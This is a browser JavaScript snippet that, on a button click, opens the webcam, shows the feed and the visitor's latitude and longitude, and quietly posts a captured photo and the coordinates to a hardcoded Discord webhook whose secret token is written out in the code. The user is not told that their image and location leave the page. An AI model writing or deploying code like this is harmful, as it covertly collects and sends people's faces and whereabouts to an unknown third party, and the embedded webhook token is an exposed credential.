document.getElementById('startButton').addEventListener('click', async () => {
    try {
        // Check for webcam and get access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        videoElement.play();
        document.getElementById('webcamContainer').appendChild(videoElement);

        // Get location data
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;

                // Capture a picture of the webcam feed
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                canvas.getContext('2d').drawImage(videoElement, 0, 0);

                const imageSrc = canvas.toDataURL('image/png');

                // Create a FormData object to send the image
                const formData = new FormData();
                formData.append('file', dataURItoBlob(imageSrc), 'webcam_capture.png');
                formData.append('content', `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`);

                // Send information to Discord webhook
                const discordWebhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe';

                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    body: formData
                });

                // Display location information
                document.getElementById('locationInfo').textContent = `Location: Latitude ${latitude}, Longitude ${longitude}`;
            }, (error) => {
                console.error('Error getting location:', error);
                document.getElementById('locationInfo').textContent = 'No location available';
            });
        } else {
            console.error('Geolocation is not supported');
            document.getElementById('locationInfo').textContent = 'Geolocation not supported';
        }
    } catch (error) {
        console.error('Error accessing webcam:', error);
        document.getElementById('webcamContainer').innerHTML = '<p>No webcam available</p>';
    }
});

function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}
